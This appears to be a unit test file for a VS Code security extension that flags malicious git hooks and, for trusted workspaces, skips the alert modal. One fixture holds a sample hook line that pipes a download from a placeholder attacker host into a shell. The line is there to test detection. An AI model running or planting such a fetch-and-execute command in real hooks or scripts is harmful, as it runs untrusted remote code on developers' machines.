/**
 * Unit tests for WorkspaceWatcher (git-hook static scan / trusted workspace)
 */

import { expect, use } from 'chai';
const sinon = require('sinon');
const sinonChai = require('sinon-chai');

use(sinonChai);
import * as vscode from 'vscode';
import { WorkspaceWatcher } from '../../monitor/analysis/workspace-watcher';
import { TrustedWorkspaceService } from '../../lib/services/trusted-workspace-service';
import { NotificationService } from '../../lib/services/notification-service';
import { IDEStatusService } from '../../lib/services/ide-status-service';
import { FsRuleType } from '../../detection/fs-rules';
import { Target } from '../../lib/events/ext-events';
import { SeverityLevel } from '../../lib/events/sec-events';
import type { HookScanMatch } from '../../monitor/analysis/hook-scanner';

suite('WorkspaceWatcher Tests', () => {
  suite('resolveWorkspacePathForFile', () => {
    let workspaceFoldersStub: sinon.SinonStub;

    setup(() => {
      workspaceFoldersStub = sinon.stub(vscode.workspace, 'workspaceFolders').value([
        { uri: { fsPath: '/home/user/project-a' }, name: 'project-a' },
        { uri: { fsPath: '/home/user/project-b' }, name: 'project-b' },
      ] as vscode.WorkspaceFolder[]);
    });

    teardown(() => {
      workspaceFoldersStub.restore();
    });

    test('should resolve workspace containing the hook file', () => {
      const resolved = WorkspaceWatcher.resolveWorkspacePathForFile(
        '/home/user/project-b/.husky/pre-commit',
      );
      expect(resolved).to.equal('/home/user/project-b');
    });

    test('should return undefined when file is outside all workspace roots', () => {
      expect(WorkspaceWatcher.resolveWorkspacePathForFile('/tmp/outside/pre-commit')).to.be.undefined;
    });
  });

  suite('triggerSecurityEvent — trusted workspace', () => {
    let isTrustedStub: sinon.SinonStub;
    let showAlertStub: sinon.SinonStub;
    let emitStub: sinon.SinonStub;
    let workspaceFoldersStub: sinon.SinonStub;

    const match: HookScanMatch = {
      filePath: '/home/user/project/.husky/pre-commit',
      content: 'curl -s https://evil.com | sh',
      rule: {
        id: 'write_git_hooks_malicious',
        name: 'Malicious Git Hooks Write',
        description: 'test',
        type: FsRuleType.WRITE,
        target: Target.FILESYSTEM,
        severity: SeverityLevel.HIGH,
        pathPattern: /.*/,
        contentPattern: /.*/,
        operations: ['write'],
        confidence: 1,
      },
    };

    setup(() => {
      workspaceFoldersStub = sinon.stub(vscode.workspace, 'workspaceFolders').value([
        { uri: { fsPath: '/home/user/project' }, name: 'project' },
      ] as vscode.WorkspaceFolder[]);
      sinon.stub(vscode.workspace, 'name').value('project');

      const mockTrusted = { isTrusted: sinon.stub() };
      isTrustedStub = mockTrusted.isTrusted;
      sinon.stub(TrustedWorkspaceService, 'getInstance').returns(mockTrusted as any);

      showAlertStub = sinon.stub(NotificationService, 'showMaliciousGitHookAlert').resolves();
      emitStub = sinon.stub(IDEStatusService, 'emitSecurityEvent').resolves();

      (WorkspaceWatcher as any).extensionMode = vscode.ExtensionMode.Production;
    });

    teardown(() => {
      sinon.restore();
    });

    test('should not show git-hook modal when workspace is trusted', async () => {
      isTrustedStub.withArgs('/home/user/project').returns(true);

      await (WorkspaceWatcher as any).triggerSecurityEvent(match, true);

      expect(emitStub).to.have.been.calledOnce;
      expect(showAlertStub).to.not.have.been.called;
    });

    test('should show git-hook modal when workspace is not trusted', async () => {
      isTrustedStub.withArgs('/home/user/project').returns(false);

      await (WorkspaceWatcher as any).triggerSecurityEvent(match, true);

      expect(emitStub).to.have.been.calledOnce;
      expect(showAlertStub).to.have.been.calledOnce;
    });
  });
});
